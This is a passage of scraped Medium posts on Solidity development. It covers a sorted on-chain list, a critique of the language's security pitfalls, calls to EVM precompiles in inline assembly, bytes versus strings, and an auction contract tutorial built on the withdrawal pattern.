"2019-07-15", "last_modified_date": "2019-07-15", "readtime": "5.09", "claps": 2863, "voters": 64, "content": "Solidity 102 #3: Maintaining Sorted listBun UthaitiratFollowJul 15 \u00b7 6 min readThis is part 3/N of Band Protocol\u2019s \u201cSolidity 102\u201d series. We explore and discuss data structures and implementation techniques for writing efficient Solidity code under Ethereum\u2019s unique EVM cost model. Readers should be familiar with coding in Solidity and how EVM works in general.In the previous article, we talked about (data structure that can iterate on each element) how to add/remove element to/from list. Today we will extend our data structure to maintain sorted link-list on-chain. Like the previous article, we will explain by showing implementation of each functions. Therefore we hope everyone can follow us, if you\u2019re ready, let\u2019s get into it!Example use caseWe want to create a \u201cSchool\u201d smart contract (again?) but today we just don\u2019t maintain only student address list. We need to maintain their order by their scores, that teacher can add or minus score from student and we can guarantee that our list still maintained order by score at anytime. The last requirement is we can list top-k of students for rewarding students who have a good score.Let\u2019s think about functions that we need to fulfill all requirementsThere are 5 function that we need to implement.Add new student to list with base scoreIncrease score to a studentReduce score of studentRemove student from listGet top-k student listHowever before we start implement each function, we need to set up base data structure (array, mapping, etc.) and we choose Iterable Map from last article. Create mapping to store score and write interface for each functions, base code will look like thisNote: GUARD is a header of list.Add a new student with his/her score: addStudentLet\u2019s start on the first function addStudent. There is one different thing from normal Iterable Map that is we need to insert new item at the correct index instead of add at the front of the list to maintained our order.Show how to insert dave to maintained sorted listFor make code easy to read, we created 2 helper function to find and verify index of new value._verifyIndex function for verify that value is between left and right address. It will return true if left_value \u2265 new_value > right_value (In case we maintain descending order and in the case value is equal the new one should be at back of the old ones)verify index function_findIndex helper function to find address that new value should insert after it. Loop from GUARD through list to find valid index by checking with verifyIndex. This code guarantee that we will find a valid index for surefind index functionaddStudent insert new item after valid address, update score and increase listSize.add student functionRemove a student from list: removeStudentremoveStudent is implemented same as previous article because we remove item from list from transitive property if a \u2265 b \u2265 c, then a \u2265 c (our list still sorted after remove b)Show how to remove bob from listhelper functions _isPrevStudent and _findPrevStudentcheck previous student and find previous studentAnd removeStudent same as previous article add clear scores mapping.remove student functionUpdate score of student: increaseScore and reduceScoreincreaseScore and reduceScore can use the same logic to implement that is we update value from old to a new one. The main idea is we just remove old item temporary first and add it to new(or same) index where it should be with new value, so we can reuse add/remove function.Show how to update Bob\u2019s scoreupdate score functionNote: We have checking condition if new value fit in the same index, we don\u2019t need to remove and add item to the same value(It\u2019 s just an optimization save estimate 1000 gas)If we have this updateScore function, increaseScore and reduceScore functions can be implemented with one line.increase score and reduce score functionGet top-k list of students order by their scores: getTopThere is nothing fancy in this function, just loop start from GUARD and store address to array and return that array. Easy right?get top k functionCode is published hereBonus find index optimization!Like the previous article, finding index by loop on-chain consumes gas proportionally to the length of list. We can optimize these functions by sending previous address to function (for update we need to send 2 addresses for remove and where to add later) and verify those addressed is valid by our 2 internal functions. That is why we separate verify condition and find address functions. Let\u2019s take a look on each functions!addStudentOptimized add studentA lot of requires!! We add 2 requires the first one is check existence of candidateStudent and the second one is verify that new value must be after that candidate.removeStudentJust verify by _isPrevStudent for removing element.Optimized remove studentupdateScoreOptimized update scoreWe add verify condition in case update at the same index. First condition is like remove element and second condition check for new value is valid to be old index.Full optimized code is published hereConclusionIn this article, we explore an implementation of Sorted List, a data structure that extends from Iterable Map to maintain sorted list on-chain that can add, remove, and update value in list. We also implemented an optimized version of this data structure to save gas of finding valid index. In the next article, we will extend this data structure not only get list of top-k but we will can check that address is in top-k or not in O(1)! Stay tuned for next article!Band Protocol is a platform for decentralized data governance. We are a team of engineers who look forward to the future where smart contracts can connect to real-world data efficiently without trusted parties. If you are a passionate developer and want to contribute to Band Protocol, please reach out to us at talent@bandprotocol.com.", "responses": 0, "tags": ["Solidity", "Smart Contracts", "Solidity 102", "Blockchain", "Ethereum"]}, {"title": "For god\u2019s sake, can\u2019t we fix Solidity?", "post_link": "https://medium.com/topl-blog/for-gods-sake-cant-we-fix-solidity-9bc7184e2683?source=search_post", "author_name": "Matt Kindy", "author_link": "https://medium.com/@m.kindy", "publish_date": "2017-08-01", "last_modified_date": "2018-05-28", "readtime": "4.66", "claps": 186, "voters": 48, "content": "For god\u2019s sake, can\u2019t we fix Solidity?Smart contracts are here: we need to support transitioning developers into the new paradigm.Matt KindyFollowAug 1, 2017 \u00b7 5 min readI\u2019m a coder, born and raised.My dad encouraged me to learn C probably before I had figured out how to write English properly. Our household was always littered with hard drives, monitors, and \u2014 let\u2019s be honest \u2014 games. It was this environment that eventually led me back to computation after a brief stint with physics in college, caused me spend a bit more time toying with Bitcoin than completing problem sets in 2012, and made me excited about Ethereum when it was first conceived. Ethereum and Bitcoin were what inspired me to work on security research and cryptography in the first place.You can imagine my chagrin when I realised that the main programming language for smart contracts negates many of the security guarantees of blockchains at-large.Let\u2019s get down to brass tacks. Solidity seems to be inspired by Go and Javascript and ends up as the sandboxed child of both, with few of the best qualities and some new terrible ones. A marginally complex sample of Solidity code will end up looking something like this (borrowed, with minor edits, from Solidity documentation):pragma solidity ^0.4.11;contract SimpleAuction {    address public beneficiary;    uint public auctionStart;    uint public biddingTime;    address public highestBidder;    uint public highestBid;    mapping(address => uint) pendingReturns;    bool ended;    // Events that will be fired on changes.    event HighestBidIncreased(address bidder, uint amount);    event AuctionEnded(address winner, uint amount);    function SimpleAuction(        uint _biddingTime,        address _beneficiary    ) {        beneficiary = _beneficiary;        auctionStart = now;        biddingTime = _biddingTime;    }    function bid() payable {        require(now <= (auctionStart + biddingTime));        require(msg.value > highestBid);        if (highestBidder != 0) {           pendingReturns[highestBidder] += highestBid;        }        highestBidder = msg.sender;        highestBid = msg.value;        HighestBidIncreased(msg.sender, msg.value);    }    function withdraw() returns (bool) {        uint amount = pendingReturns[msg.sender];        if (amount > 0) {            pendingReturns[msg.sender] = 0;            if (!msg.sender.send(amount)) {                pendingReturns[msg.sender] = amount;                return false;            }        }        return true;    }    function auctionEnd() {        require(now >= (auctionStart + biddingTime));        require(!ended);        ended = true;        AuctionEnded(highestBidder, highestBid);        beneficiary.transfer(highestBid);    }}One of the statements commonly made about Solidity is that it feels similar to Javascript. Look, if you\u2019re one of the people saying this, I\u2019m not trying to claim that the syntax is totally foreign, but saying that it\u2019s like Javascript is such a bizarre statement to make. Yes, there are your normal function and if and your friendly braces, and no, there aren\u2019t those funny := operators.The one reliable way to anger a Javascript developerBut then we get into the fact that semicolons aren\u2019t optional, return and declaration types are explicit, the literal 0 is a byte (not an int), and pretty soon you\u2019ll realise that almost any other general-purpose language (syntax, style, and use) makes for a better comparison. And thank goodness for that, considering that the static typing helps tremendously with deciphering author intent.So what are we actually borrowing from Javascript? Certainly not any of the functional core. I imagine we\u2019ve just gained some comfort in knowing that by talking about Javascript, we have made Solidity somehow more accessible.And perhaps herein lies the problem: by trying to make smart contract writing as superficially accessible as possible, we\u2019ve unwittingly assigned the critical task of designing once-deployable, unfamiliarly-patterned financial software to full stack devs who are used to building things that have completely incomparable degrees of adverse effects from failure.Consider the following \u2014 well documented \u2014EVM security considerations (credit Solidity team, but also check out the \u201cminor\u201d issues):Re-entrancyContract stalling due to excessive gas consumptionCallstack depth attacksRight now, re-entrancy is a completely foreign concept to anyone who hasn\u2019t spent significant time learning and working with the EVM.And there still aren\u2019t any tools \u2014 not even the Solidity compiler! \u2014 that provide warnings for it.(edit: Christian Reitwie\u00dfner corrected me \u2014 the Remix IDE offers these warnings)Oyente, at least, is in beta, while solint seems to have fallen by the wayside, if it was ever really there. And, of course, the biggest issue is that many of the best-practice tools that do exist are not widely considered mandatory, which is absurd. The best we\u2019ve got is a section in the Solidity documentation on the Checks-Effects-Interactions pattern.So the problem of finding a competent developer is exacerbated, no doubt, by the fact that decent Solidity developers are often being asked to sign NDAs and the like. This makes it just a tad difficult for them to show the appropriate knowledge of these strange patterns, since they can\u2019t reveal any code they\u2019ve actually, you know, coded.Of course, Emin G\u00fcn Sirer has also weighed in on this:There are some takeaways for toolchain developers as well: the Solidity compiler, or lint-like tools, need to detect and warn about these kinds of anti-patterns.At a higher level, I see no good reason why the EVM should enable the default function of a contract to engage in arbitrarily complex behaviors. In particular, the EVM can simply prohibit a contract B and all of its callees C, D, \u2026, Z, from making calls back to contract A when B is invoked by A, unless explicitly permitted to do so by A. That is, a default ban on cross-contract reentrancy, unless optionally disabled. Contract A still gets to call its own internal functions all day long, but if it calls out to another function, there is no coming back.Solidity also led some very experienced developers to the tar pits with the recent exploit of a bug in the Parity-endorsed wallet. The cause? Solidity sets functions to be default-public, and some constructor logic for the wallet was extracted into a separate library. Function calls were automatically forwarded for any public functions \u2014 and the constructor was public by Solidity default.And these are just a few of the concerns.At this point, I can already hear the sharpening of pitchforks \u2014 but, moving forward, what should we do to fix this?For starters \u2014 and I\u2019m going to sound a little familiar with this next refrain \u2014 we need compiler level warnings on re-entrancy. If I\u2019m working in Scala with Intellij IDEA, by default it warns me about potential side effects in monadic transformations if I\u2019ve added them, intentionally or otherwise.How about explicit annotations for functions that depend on calls to other contracts?Perhaps we should consider introducing functional-style libraries (a la Java 8) to further improve the language and inculcate the value of eliminating side effects?Let\u2019s not put the burden of learning strange new patterns solely on the shoulders of new developers. We should expect more from the most widely used smart-contract language in the world.If you enjoyed this somewhat cathartic rant, please recommend and share it! To keep up with Topl and to learn more about our own terrible problems and tell us why we\u2019re not qualified to comment on Ethereum, you can follow us on Twitter, our blog, check out out our website, or join our Slack. Thanks!", "responses": 2, "tags": ["Ethereum", "Engineering", "Solidity", "Programming", "Blockchain"]}, {"title": "precompiles & solidity", "post_link": "https://medium.com/@rbkhmrcr/precompiles-solidity-e5d29bd428c4?source=search_post", "author_name": "rebekah", "author_link": "https://medium.com/@rbkhmrcr", "publish_date": "2017-12-06", "last_modified_date": "2018-06-16", "readtime": "5.50", "claps": 501, "voters": 57, "content": "precompiles & solidityrebekahFollowDec 6, 2017 \u00b7 6 min readPeople are (hopefully?) excited about the precompiles introduced in ethereum\u2019s october 15th hardfork, and all the fancy privacy friendly things you can now do with ethereum. However, it\u2019s a bit tricky using precompiles if you don\u2019t know how to call them, and get all of that low-gas-consuming goodness for yourself. So I\u2019ll explain.Fancy vim solidity syntax highlighting courtesy of https://github.com/tomlion/vim-solidity. Also note the ability to do 'if\u2019 in inline assembly!inline assembly? The evm? Precompiles? Solidity???I\u2019m going to assume you know what solidity looks like, and the general idea of ethereum. All we care about here is that ethereum has a distributed (replicated on every computer running a full node) virtual machine (the EVM), with an instruction set that anyone can choose to have executed and recorded on the blockchain, with state updated accordingly.precompilesThe precompile directory in ethereum\u2019s Go client currently looks like this:var PrecompiledContractsByzantium = map[common.Address]PrecompiledContract{     common.BytesToAddress([]byte{1}): &ecrecover{}, common.BytesToAddress([]byte{2}): &sha256hash{}, common.BytesToAddress([]byte{3}): &ripemd160hash{}, common.BytesToAddress([]byte{4}): &dataCopy{}, common.BytesToAddress([]byte{5}): &bigModExp{}, common.BytesToAddress([]byte{6}): &bn256Add{}, common.BytesToAddress([]byte{7}): &bn256ScalarMul{}, common.BytesToAddress([]byte{8}): &bn256Pairing{},}This is mapping precompiles (listed on the right) to the addresses at which the precompile resides. The new precompiles are the last four:bigModExp now resides at address 0x05, and performs b^e mod m, taking as input, in order:- length of the base;- length of the exponent;- length of the modulus;- the base itself (b above);- the exponent itself (e);- the modulus (m).bn256Add lives at0x06, and performs (x1, y1) + (x2, y2), with x1, y1, x2, and y2 as 256 bit field elements, such that (x1, y1) and (x2, y2) are valid points on the curve bn256, which has equation y^2 = x^3 + 3 mod fieldOrder. The inputs here are simply x1, y1, x2, y2.bn256ScalarMul lives at 0x07, and performs scalar * (x, y), for scalar in a group with the order of the curve, and (x, y) a valid curve point as above. The inputs here are x, y, scalar.bn256Pairing lives at 0x08. This takes as input arbitrarily many pairs of elliptic curve points, and performs the pairing check e(g1, g2) = e(-h1, h2), with g1 and h1 from G1, and g2 and h2 from G2. - Points from G1 have the form (x, y), as we have seen above;- points from G2 have the form (ai + b, ci + d), and a, b, c, d (in that order \u2014 imaginary, real, imaginary, real) need to be supplied in the precompile call. The bn256Pairing code first checks that a multiple of 6 elements have been sent, and then performs the pairings check(s).The values x, y, a, b, c, d are all field elements, and so they are taken modulo the field order. The value scalar, as used in bn256ScalarMul, is modulo the elliptic curve group order.We\u2019re going to explore through two main examples, bn256ScalarMul and bigModExp. bn256ScalarMul operates very similarly to bn256Add, and bn256Pairing operates a little more like bigModExp, as they both take variable length inputs. This means the input size needs to be given to the function as a parameter alongside the actual function inputs you'd expect to be present. If you\u2019re brave (or already understand solidity and are just looking for copy-pastey code), here is what the function for calling bn256ScalatMul looks like:function ecmul(uint256 x, uint256 y, uint256 scalar) public constant returns(uint256[2] p) {  // With a public key (x, y), this computes p = scalar * (x, y).  uint256[3] memory input;  input[0] = bx;  input[1] = by;  input[2] = scalar;  assembly {    // call ecmul precompile    if iszero(call(not(0), 0x07, 0, input, 0x60, p, 0x40)) {      revert(0, 0)    }  }}This snippet introduces precompile handling that wasn\u2019t possible before the various hardforks earlier this year. In particular, inline assembly now has support for if statements, and defining the amount of gas to be sent along with a call has been made simpler \u2014 calling with gas equal to not(0), as we have here, will send all available gas to the function being called. This removes the need to guess or upper-bound the amount of gas being sent yourself.The revert opcode reverts all state changes. It\u2019s slotted in after calls to ensure that if we\u2019ve run out of gas or experienced some other disaster while calling the precompile in question, all potentially partially complete state changes will be reverted.the evmpersistent storageThe persistent memory associated with each address is called storage. This is a key-value store, mapping 256-bit words to 256-bit words. It cannot be enumerated from inside a contract, and contracts have no access or view of the storage associated with other addresses.If you initialise variables as in uint256 blah;, this will save blah to storage. uint is an alias of uint256, but bytes can also be assigned on a more fine-grained level, using uint8, uint16, etc.volatile memoryThe EVM has a virtual stack with which to store 256 bit values. 256-bit words were chosen for compatibility with cryptographic operations. All EVM operations are performed using this virtual stack. The maximum number of elements the stack can contain is 1024. You can copy one of the top 16 elements, or swap the top element with one of the 16 below (meaning you can here access the 17th highest value on the stack). All other opcodes take the pre-determined number of elements from the top of the stack and then push the return value onto the stack.Volatile memory is received as a freshly cleared instance for each message call. Memory is allocated in words, and gas is used to pay for the expansion of memory to hold the amount of words you\u2019re storing. We need the values with which we want to call a precompile to be sat at the top of this memory.We can assign variables previously stored in storage to memory in the following way:uint256[2] memory inputToPrecompile;input[0] = somePreviouslyStoredValue;input[1] = someOtherPreviouslyStoredValue;This is, in fact, exactly what we\u2019re doing with the first four lines in ecmul. We are pushing the values bx, by, and scalar to the top of the virtual stack. The precompile is then immediately called, by invoking the address where the code necessary to perform a bn256ScalarMul operation is sat. Looking at the next section of code, we see:assembly {   // call ecmul precompile  if iszero(call(sub(gas, 2000), 0x07, 0, input, 0x60, p, 0x40)) {      revert(0, 0)   }  }The call opcode is called with the following:call(gasLimit, to, value, inputOffset, inputSize, outputOffset, outputSize)We see then that, in the case of the bn256ScalarMul-calling code above, we are:Sending the amount of gas currently available to us, after subtracting 2000;Calling the contract at address 0x07, which the mapping at the top tells us corresponds to bn256ScalarMul;Sending with value 0, as we aren\u2019t giving any money to the multiplication function;Defining the input offset as input, as we have just declared in memory;Declaring the input size as 0x60, corresponding to a value of three 256 bit words, exactly the size of an elliptic curve point and one 256 bit scalar;the output will be stored at value p; andthe output size is 0x40, corresponding to the elliptic curve point that will be returned to us.And that\u2019s it! the return value of the function ecmul will now be the return value of the bn256ScalarMul precompile!modexpThe code needed to call the bigModExp precompile is as follows:function expmod(uint256 base, uint256 e, uint256 m) public constant returns (uint256 o) {  // are all of these inside the precompile now?    assembly {   // define pointer   let p := mload(0x40)   // store data assembly-favouring ways   mstore(p, 0x20)             // Length of Base   mstore(add(p, 0x20), 0x20)  // Length of Exponent   mstore(add(p, 0x40), 0x20)  // Length of Modulus   mstore(add(p, 0x60), base)  // Base   mstore(add(p, 0x80), e)     // Exponent   mstore(add(p, 0xa0), m)     // Modulus   // call modexp precompile! -- old school gas handling   let success := call(sub(gas, 2000), 0x05, 0, p, 0xc0, p, 0x20)   // gas fiddling   switch success case 0 {     revert(0, 0)   }   // data   o := mload(p)  }}This illustrates what calling a precompile with inline assembly without the if functionality looks like. The important thing to know here is that 0x40 is always free memory, and so pointers to memory can be initialised as let p := mload(0x40).And that\u2019s it! Now we can all check pairings until our hearts are content!Thanks to @chriseth for introducing me to new inline assembly abilities!!!", "responses": 6, "tags": ["Ethereum", "Blockchain", "Crypto", "Cryptocurrency", "Programming"]}, {"title": "bytes and strings in Solidity", "post_link": "https://medium.com/@cryptopusco/bytes-and-strings-in-solidity-f2cd4e53f388?source=search_post", "author_name": "Cryptopusco", "author_link": "https://medium.com/@cryptopusco", "publish_date": "2018-01-09", "last_modified_date": "2018-06-21", "readtime": "2.43", "claps": 321, "voters": 54, "content": "bytes and strings in SolidityCryptopuscoFollowJan 9, 2018 \u00b7 3 min readIn this post we are going to explain why cryptopus smart contracts love bytes & bytes arrays more than strings, which are evil for now.So, what actually is the difference between bytes and string? Solidity documentation says:As a rule of thumb, use bytes for arbitrary-length raw byte data and string for arbitrary-length string (UTF-8) data. If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.So is there any situation, when string is necessary? The answer is yes, because not all the strings, that are passed as parameters to smart contracts are one-liners.String literals are written with either double or single-quotes (\u201cfoo\u201d or \u2018bar\u2019)\u2026String literals support escape characters, such as \\n, \\xNN and \\uNNNN. \\xNN takes a hex value and inserts the appropriate byte, while \\uNNNN takes a Unicode codepoint and inserts an UTF-8 sequence.Dealing with escape characters is always difficult, but Solidity let\u2019s people work with both types of strings.Never the less would be to mention, that bytes1 to bytes32 use less gas, so they are better for the situations, when there is known for sure, that strings passed to the function are limited to the size of bytes type.pragma solidity ^0.4.19;contract BytesOrStrings {  string constant _string = \"cryptopus.co Medium\";  bytes32 constant _bytes = \"cryptopus.co Medium\";  function  getAsString() public returns(string) {    return _string;  }  function  getAsBytes() public returns(bytes32) {    return _bytes;  }}Simple smart-contract above is dedicated to demonstrate the difference between both types and Gas Conversion of them. As for bytes32 type, the gas amount used is:{\"transactionHash\": \"0xa50b4f040acb653735a0d496c34c1b6b5a635e1b21de334fb2427f3e866fbc47\",\"transactionIndex\": 0,\"blockHash\": \"0xbfd158d140cec5015baa989dc32f075599ed7186dcc026e86690521ac6b8fb5f\",\"blockNumber\": 7,\"cumulativeGasUsed\": 21484,\"gasUsed\": 21484,\"contractAddress\": null}The string type is not that cheap and comes with:{\"transactionHash\": \"0x7dc6e89537ff0992a12db432210b5dd7653f9f7bbd16fe56f14c73053134849f\",\"transactionIndex\": 0,\"blockHash\": \"0x8cac42f6fddf98cb17e3fcb7c5f94a6db5ca57739407caf68659c12a62ce81a1\",\"blockNumber\": 8,\"cumulativeGasUsed\": 21916,\"gasUsed\": 21916,\"contractAddress\": null}As you can see, the difference between calls is small, but still is. In a bigger examples, where amount of functions and commands is higher that in a sample, it is always important to keep an eye on it.Second reason to use bytes over string is smart-contract to smart-contract relations. Solidity ver. 0.4.19 is still unable to return string as function\u2019s result for other contracts. It may look like really unnecessary stuff to know, but smart contracts are getting complex with each day and the further it goes, the more contract2contract realtions are going to appear on Blockchain.Talking about cryptopus API, we use bytes32 as the only format of string storage. Our structures inside Library are all bytes32 oriented:struct brokerWallet {  bytes32 APIKey;  bytes32 APISecret;  bytes32 historyHash;  bytes32 balanceHash;  uint256 nonce;}struct cryptoBroker {  uint8   flag;  bytes32 username;  uint256 registerDate;}We also return bytes32 as function results of Storage contract, because this contract is only about to face User Interface contract:function balanceOf(address _owner, uint256 _position) onlyOLevel external constant returns (bytes32) {  return brokersWallets[_owner][_position].balanceHash;}function historyOf(address _owner, uint256 _position) onlyOLevel external constant returns (bytes32) {  return brokersWallets[_owner][_position].balanceHash;}In conclusion to this post we want to add, that there is also a workaround for those, who don\u2019t want to use strings in any case. Try to use bytes32[] (arrays). There is an assembly way to get string\u2019s length, so it is possible to allocate as many bytes32 elements as needed.Thank you for your interest and, please, stay tuned!We also do love answering questions in our Telegram Chat!", "responses": 1, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Development", "Blockchain"]}, {"title": "Solidity tutorial: building a simple auction contract", "post_link": "https://medium.com/@bryn.bellomy/solidity-tutorial-building-a-simple-auction-contract-fcc918b0878a?source=search_post", "author_name": "Bryn Bellomy", "author_link": "https://medium.com/@bryn.bellomy", "publish_date": "2017-06-29", "last_modified_date": "2018-06-07", "readtime": "8.83", "claps": 408, "voters": 54, "content": "Solidity tutorial: building a simple auction contractBryn BellomyFollowJun 29, 2017 \u00b7 9 min readWhen Solidity developers are first getting their hands dirty writing smart contracts, there comes a point at which they\u2019ve digested a fair amount of the syntax and the low-level details of the EVM, and it\u2019s time to actually start building something.An auction provides a perfect first project. It\u2019s just complex enough that it\u2019ll require some planning \u2014 a crucial habit of mind when writing contracts. You never want to just sit down and start coding. It will also give us the opportunity to explore a number of architectural best practices that will prove useful down the road. Let\u2019s see what we can throw together.If you\u2019re more of a \u201cjust give me the code\u201d type of developer, I\u2019ve posted the full app here:https://github.com/brynbellomy/solidity-auctionThe Auction contract is in the contracts folder.Start with the interfaceOur auction contract will have a simple interface that allows users to place bids and, after the auction is complete, withdraw their funds. The owner of the auction needs to be able to cancel the auction in exceptional cases, and must also be allowed to withdraw the winning bid.I\u2019ve settled on the following interface, which should provide just enough expressiveness to handle this functionality. Notice that this is also a good time to think about the events that we might want these functions to emit.Simple enough, right?Plan your storage variablesLet\u2019s also spend a bit of time thinking about what kinds of storage variables we want to keep on hand. Here\u2019s what I came up with. Notice that I\u2019ve informally separated these into \u201cstatic\u201d data, which doesn\u2019t change over the life of the contract, and \u201cstate\u201d data, which does.Some of these are self-explanatory, like canceled and fundsByBidder. We\u2019ll see how these are used when we start writing our contract\u2019s functions. What about the rest?Every auction needs an owner \u2014 the person to whom the winning bid will go if the auction completes successfully. If you were so inclined, you might want to separate out the \u201ccontroller\u201d (say, the person or contract that has permission to cancel the auction) from the \u201cbeneficiary\u201d (the person or contract to whom the funds will go after the auction is over), but I\u2019ll leave that as an exercise to the reader. For now, they\u2019re one and the same.Auctions also require a start and end time. Time in Solidity is a bit tricky \u2014 block timestamps are set by miners, and are not necessarily safe from spoofing. An emerging best practice is to demarcate time based on block number. We know with a fair amount of certainty that Ethereum blocks are generated roughly every 15 seconds; consequently we can infer timestamps from these numbers rather than the spoofable timestamp fields. Hence, startBlock and endBlock. If we build our UI correctly, this abstraction should be invisible to the user.I\u2019ve also included a field for storing an IPFS hash. The data referred to by this hash may contain things like the auction\u2019s title and description, photo URLs, etc. Storing data in smart contracts can be very expensive. If you need to associate large amounts of metadata with your contract that isn\u2019t critical to its business logic, it\u2019s a much better idea to find an off-chain storage solution, and simply store a reference so that it can be retrieved separately. We\u2019re not going to refer to the ipfsHash field in this tutorial; it\u2019s included as a reminder of proper contract/dApp architecture.What about bidIncrement and highestBindingBid? It\u2019s worth taking a moment to explain these. On many popular auction platforms, users are incentivized to bid the maximum they\u2019re willing to pay by not binding them to that full amount, but rather to the previous highest bid plus the increment. That\u2019s a mouthful, so let me give an example. Let\u2019s say the current highest bid is $430, and the bidIncrement is $10. You decide to bid $500. However, you are only obligated to pay $440 (the current highest bid + bidIncrement) if you win the auction. In this case, $440 is the highestBindingBid. If someone comes along and bids $450, you will still be the highestBidder, but the highestBindingBid will be raised to $460. It\u2019s sort of like asking the platform to automatically bid for you up to a given amount, after which point you\u2019ll need to make a decision to raise your maximum bid or bow out. Just to be clear, anything you send in excess of highestBindingBid will be refunded to you when you win the auction.The constructorOur constructor is extremely simple:It checks some preconditions and then sets a few variables in the contract\u2019s storage (namely, the ones we marked \u201cstatic\u201d).We refuse to create auctions with invalid start and end times: the start time must be before the end time, and it must also be after the current block (in other words, you can\u2019t create a new auction that started at some point in the past).We also reject auctions with an empty owner parameter \u2014 funds would get locked in the contract and would be impossible to withdraw.Placing a bidBefore we sit down to start writing our placeBid() function, we should do a little bit of planning. We know that there are only certain cases in which it should be possible to place a new bid \u2014 it shouldn\u2019t be allowed before the auction starts, after it ends, or if it\u2019s canceled. We also know that it would be considered moral hazard if the auction\u2019s owner were allowed to place bids (since he or she could run up the price, hoping for more profits). We need to make sure that placeBid() fails if these constraints aren\u2019t met.Implement preconditions with reusable function modifiersThis sounds like a list of preconditions \u2014 a perfect application of Solidity\u2019s function modifiers. Let\u2019s imagine we want to place the following constraints on our placeBid() function:Take note of the fact that we err on the side of \u201cmany small modifiers\u201d: each precondition is as minimal as possible. This makes our modifiers more reusable.Let\u2019s imagine we had taken the opposite approach. For example, we might have decided during the planning phase that we needed an onlyRunning modifier to prevent certain actions unless the auction was actually running. It might look something like this:Don\u2019t do this.\u201cGreat!\u201d you think, as you proceed to apply it to placeBid() and cancelAuction(). But wait, wouldn\u2019t it be smart to make it possible to cancel an auction before it starts? To accomplish that, we would need a new modifier, onlyBeforeEndAndNotCanceled, to express the preconditions of the cancelAuction() function. At this point, we\u2019re just creating a separate modifier for every function, meaning we might as well not be using modifiers at all.The optimal approach is to make each modifier as dead-simple as possible, with the aim of reusing them frequently:Simple modifiers are best.With our preconditions in place, let\u2019s take a step back from the code for a moment to think about how placeBid() should actually work.Users should be able to send ETH to this function, and depending on how much they sent, they will either become the highestBidder or will cause the highestBindingBid to increase.Taking a first stab at an implementation, we might decide that there are a few cases where we want to refund someone\u2019s ETH:When the current highestBidder is outbid by someone else.When someone places a bid greater than highestBindingBid but less than highestBidder's maximum bid.This seems fair and intuitive, right? Why lock up someone\u2019s funds if they aren\u2019t the highestBidder?Wrong.Don\u2019t proactively send, use the withdrawal patternWe know from the DAO hack that it\u2019s always best to stick to a \u201cwithdrawal\u201d pattern \u2014 this helps us to avoid re-entrance bugs that could cause unexpected behavior (including catastrophic financial loss for our users). We should only send ETH to a user when they explicitly request it, and we should try to avoid doing much of anything else in that function.For example, what would happen if a user sent a bid from a contract with a maliciously-crafted fallback function designed to expend all of the gas provided to it? That user could never be outbid, because when someone else tried to place a bid, the EVM would send ETH back to that malicious fallback function. The transaction would run out of gas, preventing the new user\u2019s bid from being recorded.So placeBid() should simply accept payments of ETH and then recalculate some of the contract\u2019s storage variables, like highestBidder, fundsByBidder, and highestBindingBid. If a user is outbid, their ETH remains locked up in the contract for the time being. This is fine, because they can simply withdraw it manually when the auction ends.The UI should bridge the gap between what the contract expects and what our users expectThere\u2019s an unintuitive consequence of holding onto everyone\u2019s ETH until the end of the auction, and we\u2019ll have to make sure we handle it correctly. Namely, when a user has been outbid and wishes to raise their bid to become the highestBidder again, they only need to send enough ETH to bring their total over the current highest bid (because we\u2019re still holding onto the funds from their previous bid). For example, you bid 70 ETH, and then someone else bids 80 ETH. To outbid them, you would only need to send an additional 10.000000000000000001 ETH the next time you call placeBid() (although you could certainly send more).This seems strange on the surface \u2014 after all, when you\u2019re bidding on a pair of ice skates on eBay, you express your bid using the full amount. If you bid $70, and someone else bids $80, you don\u2019t bid \u201c$20\u201d to outbid them. You would probably type \u201c$90\u201d in the input field.This is where it\u2019s important to recognize the separation of concerns between the contract and the UI. Ideally, the UI is responsible for smoothing over this oddity; the contract\u2019s job is simply to ensure that the business logic is executed securely and correctly, even if that business logic seems a little bit strange to human intuition.So what does our placeBid() function look like? I don\u2019t want to waste words here dissecting every line of the business logic, since the goal of this article is to address broader architectural patterns and concerns. For those interested in fine-grained detail, I\u2019ve tried to annotate the code with comments where appropriate.We\u2019re handling several cases here:A user has sent an amount that isn\u2019t sufficient, in which case we throw.A user has sent an amount that\u2019s higher than highestBindingBid but not higher than highestBid , in which case we simply increase highestBindingBid.A user has sent an amount that\u2019s higher than highestBid, in which case they become the new highestBidder.The current highestBidder wishes to raise their maximum bid, in which case we accept their ETH, increment fundsByBidder[highestBidder], and do nothing to our other contract storage variables.Withdrawing funds after the auctionWhen the auction is over, whether it\u2019s canceled or not, users should be able to withdraw the ETH that they used to place their bids.Withdrawals should only be permitted after the auction has successfully ended (block.number > endBlock) or if it was canceled. Unfortunately, we\u2019ll need a new function modifier for this, since the conditions are logically OR\u2019ed together (chaining together small modifiers only works for AND\u2019ed conditions).Technically, since this precondition is only used once (here), we could simply hard-code it into the function, but for consistent style, I chose to encapsulate it into its own modifier:There are several cases we need to handle, depending on which user is asking our contract for a withdrawal:The owner should be able to withdraw an amount of ETH equal to highestBindingBid.The highestBidder should be able to withdraw any ETH they sent in excess of highestBindingBid (in other words, their maximum bid minus highestBindingBid).Any other user should be able to withdraw all of the ETH they sent.Notice that we finally make use of our ownerHasWithdrawn storage variable so that we can correctly calculate how much to send to highestBidder. There are other ways to accomplish this, like storing highestBid as a storage variable \u2014 for our purposes, it doesn\u2019t matter much.Notice that we\u2019re following the recommended pattern for functions that send ETH:Check our preconditions.Do \u201coptimistic accounting\u201d (i.e., we do our accounting assuming that the transaction will succeed).Send ETH, and throw if the send fails (throw will roll back our optimistic accounting in that case).Log an event and return.Canceling the auctionLuckily, our cancelation function is much simpler than the others. We can make do with the following:We simply set our canceled storage variable to true, log an event, and return.It\u2019s worth pointing out that we\u2019ve been able to reuse several of our function modifiers here. Right on! In larger contracts, the benefits of these \u201cmicro-modifiers\u201d will be even more apparent.Wrapping upWell, there you have it \u2014 a decentralized eBay in ~167 lines of Solidity. Unlike other platforms that you might be used to, writing Solidity contracts generally involves very little code, but an enormous amount of attention to detail. Security, gas costs, and readability are all incredibly important considerations, and until we have better analysis tools, much of this work is left to the programmer.In a future post, I\u2019ll explain how to hook this contract up to a UI using React, truffle, and web3.js. If you have any questions, feel free to post them in the comments section!Find me around the web:Twitter: https://twitter.com/brynbellomyGithub: https://github.com/brynbellomyLinkedIn: https://www.linkedin.com/in/bryn-bellomy", "responses": 11, "tags": ["Ethereum", "Solidity", "Blockchain", "Smart Contracts"]}, {"title": "Learn Solidity. Shark of The Pool \u2014 Part 1", "post_link": 